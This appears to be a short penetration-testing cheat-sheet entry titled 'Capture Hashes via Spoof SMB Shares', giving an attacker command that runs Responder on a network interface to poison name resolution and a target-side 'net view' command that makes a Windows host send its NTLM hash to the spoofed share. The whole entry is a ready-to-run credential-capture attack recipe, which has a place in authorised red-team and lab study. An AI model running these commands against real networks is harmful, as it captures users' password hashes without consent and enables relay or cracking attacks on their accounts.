# 01 - Capture Hashes via Spoof SMB Shares

Search Tag(s): #mitm #responder #smb #relay #ntlm #scenarios

## 1.1 - Attacker

```
$ sudo responder -I <interface> -rdwv
```

## 1.2 - Target

```
C:\> net.exe view \\snare
```